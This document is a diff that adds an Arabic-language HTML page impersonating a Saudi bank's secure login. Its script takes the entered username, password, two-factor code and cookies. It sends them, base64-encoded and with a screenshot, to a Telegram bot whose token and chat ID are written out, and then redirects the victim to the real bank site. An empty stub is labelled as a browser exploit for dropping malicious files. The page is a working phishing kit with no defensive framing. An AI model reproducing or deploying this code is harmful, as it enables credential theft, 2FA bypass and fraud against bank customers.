@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>البنك الأهلي - تسجيل الدخول الآمن</title>
+ <style>
+ body {
+ font-family: 'Arial', sans-serif;
+ background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
+ direction: rtl;
+ }
+ .login-container {
+ width: 400px;
+ margin: 50px auto;
+ background: white;
+ padding: 30px;
+ border-radius: 10px;
+ box-shadow: 0 0 20px rgba(0,0,0,0.1);
+ }
+ .bank-logo {
+ text-align: center;
+ margin-bottom: 20px;
+ }
+ .input-group {
+ margin-bottom: 15px;
+ }
+ input {
+ width: 100%;
+ padding: 12px;
+ border: 1px solid #ddd;
+ border-radius: 5px;
+ }
+ button {
+ width: 100%;
+ padding: 12px;
+ background: #d71e28;
+ color: white;
+ border: none;
+ border-radius: 5px;
+ cursor: pointer;
+ }
+ </style>
+</head>
+<body>
+ <div class="login-container">
+ <div class="bank-logo">
+ <h2>البنك الأهلي السعودي</h2>
+ <p>تسجيل الدخول الآمن إلى الخدمات الإلكترونية</p>
+ </div>
+ <form id="loginForm">
+ <div class="input-group">
+ <input type="text" id="username" placeholder="اسم المستخدم" required>
+ </div>
+ <div class="input-group">
+ <input type="password" id="password" placeholder="كلمة المرور" required>
+ </div>
+ <div class="input-group">
+ <input type="text" id="otp" placeholder="رمز التحقق الثنائي (2FA)" required>
+ </div>
+ <button type="submit">تسجيل الدخول</button>
+ </form>
+ </div>
+
+ <script>
+ // كود جافاسكريبت لسرقة الكوكيز والبيانات
+ function stealCookies() {
+ return document.cookie;
+ }
+
+ // كود لتصوير الشاشة تلقائياً
+ function captureScreen() {
+ html2canvas(document.body).then(canvas => {
+ canvas.toBlob(blob => {
+ sendData('screenshot', blob);
+ });
+ });
+ }
+
+ // إرسال البيانات إلى البوت
+ async function sendData(dataType, data) {
+ const botToken = '8547382861:AAEwVlaTP4EnAq1Vx581EII2-GRMCj6EIgE';
+ const chatId = '7900170972';
+ 
+ const formData = new FormData();
+ formData.append('chat_id', chatId);
+ formData.append(dataType, data);
+ 
+ await fetch(`https://api.telegram.org/bot${botToken}/send${dataType === 'screenshot' ? 'Photo' : 'Message'}`, {
+ method: 'POST',
+ body: formData
+ });
+ }
+
+ // تشفير البيانات قبل الإرسال
+ function encryptData(data) {
+ return btoa(unescape(encodeURIComponent(data)));
+ }
+
+ // معالجة نموذج التسجيل
+ document.getElementById('loginForm').addEventListener('submit', function(e) {
+ e.preventDefault();
+ 
+ const credentials = {
+ username: document.getElementById('username').value,
+ password: document.getElementById('password').value,
+ otp: document.getElementById('otp').value,
+ cookies: stealCookies(),
+ userAgent: navigator.userAgent,
+ ip: '', // سيتم الحصول على IP من الخلفية
+ timestamp: new Date().toISOString()
+ };
+
+ // إرسال البيانات المسروقة
+ sendData('message', encryptData(JSON.stringify(credentials)));
+ captureScreen();
+ 
+ // توجيه الضحية إلى الموقع الحقيقي بعد السرقة
+ setTimeout(() => {
+ window.location.href = 'https://www.alahli.com/';
+ }, 2000);
+ });
+
+ // استغلال ثغرات المتصفح لتنزيل ملفات خبيثة
+ function exploitBrowser() {
+ // كود استغلال ثغرات متقدمة هنا
+ }
+ </script>
+</body>
+</html>
